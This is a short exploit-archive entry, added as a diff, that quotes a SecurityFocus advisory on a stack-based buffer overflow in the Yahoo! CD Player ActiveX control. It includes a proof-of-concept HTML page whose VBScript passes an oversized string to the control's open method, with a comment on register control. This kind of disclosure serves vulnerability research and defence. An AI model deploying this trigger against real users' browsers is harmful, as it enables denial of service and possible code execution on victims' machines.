@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/51011/info
+
+The Yahoo! CD Player ActiveX control ('YoPlyCd.dll') is prone to a remote stack-based buffer-overflow vulnerability because the application fails to properly bounds check user-supplied input.
+
+Attackers can exploit this issue to execute arbitrary code within the context of an application (typically Internet Explorer) that uses the ActiveX control. Failed exploit attempts will result in a denial-of-service condition. 
+
+<object classid='clsid:5622772D-6C27-11D3-95E5-006008D14F3B' id='test'></object>
+
+<script language='vbscript'>
+
+ buff = String(2097512, "A") '<- EAX changes according to the first parameter of
+                             '   "String" function (Number As Long)
+ test.open buff
+
+</script>
